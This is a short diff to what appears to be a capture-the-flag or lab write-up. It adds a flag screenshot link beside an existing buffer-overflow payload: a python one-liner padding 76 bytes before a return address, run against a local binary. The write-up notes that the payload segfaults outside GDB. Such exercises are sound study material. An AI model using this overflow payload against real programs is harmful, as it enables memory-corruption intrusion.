@@ -99,6 +99,7 @@ We also tested the payload directly:
 payload=$(python -c "print 'A'*76 + '\x64\x88\x04\x08'")
 ./bin $payload
 ```
+![Succsess Flag](./images/image.png)
 
 However, running the payload outside GDB resulted in a segmentation fault, indicating that direct exploitation was not straightforward due to the environment setup.
 
